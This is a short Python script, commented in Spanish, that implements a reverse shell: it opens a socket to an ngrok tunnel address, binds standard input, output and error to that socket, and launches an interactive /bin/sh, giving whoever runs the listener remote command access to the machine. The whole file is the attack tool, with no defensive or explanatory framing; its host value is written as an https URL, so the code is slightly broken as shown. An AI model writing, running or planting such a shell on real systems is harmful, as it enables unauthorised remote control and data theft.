import socket
import subprocess
import os

# Configuración
LHOST = "https://06ac-167-60-62-81.ngrok-free.app"  # Dirección de tu ngrok
LPORT = 80  # Puerto al que conectará

def reverse_shell():
    try:
        # Conectar al servidor
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))

        # Redirigir entrada/salida
        os.dup2(s.fileno(), 0)  # Entrada estándar
        os.dup2(s.fileno(), 1)  # Salida estándar
        os.dup2(s.fileno(), 2)  # Error estándar

        # Ejecutar shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    reverse_shell()
